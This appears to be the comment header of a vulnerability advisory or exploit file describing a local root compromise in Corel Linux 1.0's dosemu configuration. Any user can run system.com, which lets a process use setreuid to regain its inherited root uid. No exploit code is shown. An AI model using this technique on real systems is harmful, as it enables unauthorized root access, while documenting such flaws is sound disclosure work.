#  suid@suid.kg - Corel Linux dosemu config error. Local root compromise.
#
#  Software: 	Corel Linux 1.0 dosemu distribution configuration
#  URL:		http://linux.corel.com
#  Version:	Version 1.0
#
#  The system.com command is available to any user who runs the
#  dos emulator. This is a direct violation of the advice from 
#  the SECURITY readme file:
#
# Never allow the 'system.com' command (part of dosemu) 
# to be executed. It makes dosemu execute the libc
# 'system() function'. Though privileges  are turned off,
#  the process inherits the switched uid-setting (uid=root,
#  euid=user), hence the  unix process can use setreuid to
#  gain root access back. ... the rest you can imagine your self.
